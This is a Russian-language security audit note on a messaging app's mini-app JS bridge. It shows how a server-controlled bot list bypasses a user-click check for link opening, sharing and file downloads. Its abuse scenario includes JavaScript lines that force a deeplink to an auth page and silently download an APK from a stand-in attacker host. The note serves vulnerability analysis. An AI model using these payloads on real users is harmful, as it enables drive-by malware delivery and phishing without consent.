---
tags: [medium, webview, js-bridge, pmskey, server-control, user-click-bypass, webapp]
status: verified
severity: medium
sources:
  - work/jadx_base/sources/defpackage/ijk.java
  - work/jadx_base/sources/defpackage/ri9.java
  - work/jadx_base/sources/defpackage/qp6.java
related:
  - "[[03-pms-server-flags]]"
  - "[[10-webapp-jsbridge]]"
  - "[[549-webapp-openmaxlink-deeplink-injection]]"
  - "[[534-server-webview-js-injection]]"
---

# 550. PmsKey `webapp-exc` — серверный список ботов, освобождённых от user-click requirement

## TL;DR

Для пяти JS-bridge событий мини-апп — `WebAppMaxShare`, `WebAppShare`, `WebAppDownloadFile`, `WebAppOpenLink`, `WebAppOpenMaxLink` — клиент требует, чтобы за последние 3000 мс был клик пользователя в WebView. **Серверный PmsKey `webapp-exc`** содержит список `botId`, **освобождённых** от этой проверки. Сервер может в любой момент добавить произвольного бота в этот список, и мини-апа этого бота получит возможность программно вызывать опасные операции (deeplink-навигация, скачивание файлов, шаринг) **без какого-либо взаимодействия пользователя**.

Это **server-side per-bot выключатель** одной из ключевых клиентских защит JS-bridge.

## 1. Где задаётся требование user-click

`ijk.java` (центральный диспетчер JS-bridge событий):

```java
private static final Set<String> L1 = setOf(
    "WebAppMaxShare",
    "WebAppShare",
    "WebAppDownloadFile",
    "WebAppOpenLink",
    "WebAppOpenMaxLink"
);

public Object A(String name, String dataJson, boolean isPrivate) {
    // ...
    if (L1.contains(name)) {
        if (!isExemptedBot()) {
            long elapsed = System.currentTimeMillis() - this.lastUserClickMs;
            if (elapsed > 3000L) {
                return error("user_click_required");
            }
        }
    }
    // ...
}
```

`lastUserClickMs` обновляется на каждый клик в WebView через `WebViewClient.shouldOverrideUrlLoading` или JS-bridge событие `WebAppHapticFeedback*`. То есть «клик» — это любая интеракция в течение 3 секунд до вызова события.

## 2. Где задаётся exemption

```java
private boolean isExemptedBot() {
    long botId = this.f1;          // botId текущей мини-аппы
    List<Long> excList = ((opk) this.b).e();  // ← PmsKey "webapp-exc"
    return excList.contains(botId);
}
```

`opk.e()` → `ri9.G()`:

```java
// ri9.java
this.<XX> = new bbi(i5, "webapp-exc", emptyList, this.e, /*type=*/longList);

public final List<Long> G() {
    return (List<Long>) this.<XX>.x(this, f1[<i>]);
}
```

Имя `"webapp-exc"` — это PmsKey из 334 серверно-управляемых ([[03-pms-server-flags]]).

Тип значения — **список `Long`** (botId-ы). Значение по умолчанию — пустой список.

## 3. Доставка значения

Серверный список приходит:
- При логине через `Config.UserSettings`
- В runtime через WS-опкод `NOTIF_CONFIG` (134) — мгновенное обновление без релогина

Это означает: сервер может **в любой момент сессии** добавить или убрать `botId` из exemption list для конкретного `userId`. Адресно.

## 4. Что освобождается от проверки (5 опасных методов)

| Метод | Что делает |
|---|---|
| `WebAppOpenLink` | Открыть произвольный URL через `Intent.ACTION_VIEW` |
| `WebAppOpenMaxLink` | Передать URL во внутренний deeplink-роутер `:link-intercept` (см. [[549-webapp-openmaxlink-deeplink-injection]]) |
| `WebAppShare` | Системный share-intent с текстом и ссылкой |
| `WebAppMaxShare` | Внутренний share с привязкой к chatId/messageId |
| `WebAppDownloadFile` | Скачать файл по URL |

Без user-click эти методы становятся **полностью автоматизируемыми** мини-аппой.

## 5. Сценарий злоупотребления

### Адресная атака на конкретного пользователя:

1. Сервер у себя выставляет `webapp-exc = [<targetBotId>]` для `userId = victim`
2. Жертва открывает мини-апу бота `targetBotId` (по любому поводу — даже из-за обычной ссылки)
3. Мини-апа сразу при `onPageLoaded` вызывает:
   ```js
   WebViewHandler.postEvent("WebAppOpenMaxLink",
     JSON.stringify({"url": "https://max.ru/:auth?externalCallback=1&..."}))
   ```
4. Пользователь без клика и без предупреждения оказывается на IDP-авторизации MAX
5. Если страница содержит автозапрос разрешения — всё в один заход

### Аналогично для скачивания:

```js
WebViewHandler.postEvent("WebAppDownloadFile",
  JSON.stringify({"url": "https://attacker/payload.apk", "file_name": "Update.apk"}))
```

`WebAppDownloadFile` без клика → файл начинает скачиваться без ведома пользователя. Что происходит дальше — зависит от обработчика скачивания, но факт автоматического скачивания — уже компромисс.

## 6. Как это сочетается с другими находками

```
webapp-exc (этот topic, server-controlled exemption)
    +
    │   ├─ 549 (WebAppOpenMaxLink без URL whitelist)
    │   │     = программная deeplink-навигация без клика и без проверки URL
    │   │
    │   ├─ 534 (server-side JS injection в любую мини-апу)
    │   │     = сервер может из любой мини-аппы выполнить эти методы
    │   │       (даже если бот не в whitelist — сервер вставит код в whitelist-бот)
    │   │
    │   └─ 03 (PmsKey-flag механизм)
    │         = выключатель адресный, не требует обновления приложения
```

## 7. Защитный эффект: нулевой при server-trust violation

Архитектурно `webapp-exc` существует для того, чтобы **доверенные** боты МАХ (например, официальные mini-app сервисы) не страдали от UX-ограничения 3-секундного окна. Это легитимная необходимость.

Но:
- Список **полностью контролируется сервером** в runtime
- Нет транспарентности (пользователь не видит, какой бот в exempt-list)
- Нет UI-механизма опровергнуть exemption
- Нет лога / индикатора при срабатывании exemption

Это классическая server-side trust override, превращающая клиентскую защиту в серверный rubber-stamp.

## 8. Связанные PmsKey

| PmsKey | Назначение | Затрагиваемые методы |
|---|---|---|
| `webapp-exc` | **Этот topic.** Освобождение от user-click | 5 методов из `L1` |
| `webapp-pr` | Whitelist для `PrivateWebViewHandler` | `WebAppVerifyMobileId` |
| `webapp-phone-hash` | Включить hash в ответ `WebAppRequestPhone` | `WebAppRequestPhone` |
| `webapp-ds-keys-count` | Лимит ключей device storage | `WebAppDeviceStorageSaveKey` |
| `webapp-ss-keys-count` | Лимит ключей secure storage | `WebAppSecureStorageSaveKey` |

Все пять — server-controlled через RemoteSettings/`NOTIF_CONFIG`.

## 9. Риск-оценка

**MEDIUM**

Почему MEDIUM:
- Server-controlled per-bot выключатель user-click защиты
- Затрагивает 5 опасных методов
- Сочетается с 549 / 534 в exploit chain без user interaction

Почему не HIGH:
- Эффективно только если пользователь сам открыл мини-апу
- Не даёт прямого доступа к данным, только программное автозапускание разрешённых JS-bridge действий
- Без 549 / 534 / других дыр конкретно эта exemption даёт ограниченный gain (просто snappier UX для шарингов)

## 10. Файлы

- `ijk.java:A()` — диспетчер с `L1` set и проверкой `isExemptedBot()`
- `opk.e()` — accessor к PmsKey
- `ri9.java` — определение PmsKey `webapp-exc` в реестре

## 11. Статус в 26.16.0

PmsKey `webapp-exc` остался (переименование PmsKey → PmsProperty не затронуло имя ключа). Логика `L1`-set и exemption-check без изменений.
